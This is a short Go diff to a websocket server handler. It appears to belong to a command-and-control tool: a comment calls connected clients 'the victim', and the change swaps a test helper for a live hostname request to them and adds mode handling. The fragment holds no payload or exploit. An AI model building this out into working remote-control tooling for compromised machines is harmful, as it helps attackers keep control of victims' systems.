@@ -30,8 +30,10 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	chk(err)
 	defer c.Close()
 
-	// Test by getting the hostname
-	go testGetHostname()
+	// Request the hostname of the victim
+	go c.WriteMessage(websocket.TextMessage, []byte("HOSTNAME"))
+
+	go waitForMode(c)
 
 	go func() {
 		for {
@@ -42,7 +44,9 @@ func handler(w http.ResponseWriter, r *http.Request) {
 			// Exclusive bidirectional ping cmd
 			if strings.HasPrefix(string(message), "PING") {
 				res, cmdName := commands.HandleCommand(message)
-				log.Println(cmdName + " " + res)
+				if pingLogs {
+					log.Println(cmdName + " " + res)
+				}
 				continue
 			}
 
@@ -60,8 +64,4 @@ func handler(w http.ResponseWriter, r *http.Request) {
 func Init() {
 	http.HandleFunc("/ws", handler)
 	chk(http.ListenAndServe(":8080", nil))
-}
-
-func testGetHostname() {
-	chk(c.WriteMessage(websocket.TextMessage, []byte("HOSTNAME")))
 }
